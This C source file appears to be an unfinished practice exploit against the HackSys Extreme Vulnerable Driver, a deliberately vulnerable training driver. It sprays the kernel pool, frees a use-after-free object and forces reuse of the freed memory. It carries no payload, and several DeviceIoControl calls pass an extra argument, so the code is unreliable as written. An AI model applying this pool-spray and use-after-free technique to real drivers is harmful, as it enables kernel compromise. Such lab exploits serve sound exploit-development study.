#include <Windows.h>
#include <stdio.h>

#define IOCTL_ALLOCATE_UAF_OBJECT 0x222013
#define IOCTL_USE_UAF_OBJECT 0x222017
#define IOCTL_FREE_UAF_OBJECT 0x22201B
#define IOCTL_ALLOCATE_FAKE_UAF_OBJECT 0x22201F

char unused = 0;

// Created by Uncodable on 5/16/2021.
// Exploit finished on ...
int main(int argc, char** argv)
{
	printf("[*] Obtaining a handle to the HackSys Extreme Vulnerable Driver...\n");
	HANDLE hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	if (hDriver == INVALID_HANDLE_VALUE)
	{
		printf("[-] Unable to obtain a handle to the HackSys Extreme Vulnerable Driver.");
		unused = getchar();
		return 0;
	}
	printf("[+] Obtained a handle to the HackSys Extreme Vulnerable Driver.\n");

	printf("[*] Spraying the non-paged pool with fake Use-After-Free objects...\n");
	char inBuffer[0x60] = { 0 };
	memset(&inBuffer, 'A', sizeof(inBuffer));
	char outBuffer[1024] = { 0 };
	DWORD bytesReturned = 0;
	int objectCount = 50000;
	for (int i = 0; i < objectCount; i++)
	{
		if (!DeviceIoControl(hDriver, IOCTL_ALLOCATE_FAKE_UAF_OBJECT, inBuffer, sizeof(inBuffer), &outBuffer, sizeof(outBuffer), &bytesReturned, NULL))
		{
			printf("[-] Allocation of fake Use-After-Free object failed. Error: %d (0x%x)\n.", GetLastError(), GetLastError());
			unused = getchar();
			return 0;
		}
	}
	printf("[+] Sprayed the non-paged pool with %d fake Use-After-Free objects.\n", objectCount);

	printf("[*] Allocating a Use-After-Free object...\n");
	DeviceIoControl(hDriver, IOCTL_ALLOCATE_UAF_OBJECT, NULL, 0, NULL, &outBuffer, sizeof(outBuffer), &bytesReturned, NULL);
	printf("[+] Allocated the Use-After-Free object.\n");

	printf("[*] Freeing the Use-After-Free object...\n");
	DeviceIoControl(hDriver, IOCTL_FREE_UAF_OBJECT, NULL, 0, NULL, &outBuffer, sizeof(outBuffer), &bytesReturned, NULL);
	printf("[+] Freed the Use-After-Free object.\n");

	printf("[*] Spraying the non-paged pool with fake Use-After-Free objects to take the real object's place...\n");
	for (int i = 0; i < objectCount; i++)
	{
		if (!DeviceIoControl(hDriver, IOCTL_ALLOCATE_FAKE_UAF_OBJECT, inBuffer, sizeof(inBuffer), &outBuffer, sizeof(outBuffer), &bytesReturned, NULL))
		{
			printf("[-] Allocation of fake Use-After-Free object failed. Error: %d (0x%x)\n.", GetLastError(), GetLastError());
			unused = getchar();
			return 0;

		}
	}
	printf("[+] Sprayed the non-paged pool with %d fake Use-After-Free objects.\n", objectCount);

	printf("[*] Forcing the usage of the fake Use-After-Free object...\n");
	DeviceIoControl(hDriver, IOCTL_USE_UAF_OBJECT, inBuffer, sizeof(inBuffer), &outBuffer, sizeof(outBuffer), &bytesReturned, NULL);

	return 1;
}
// I don't think I'm doing this right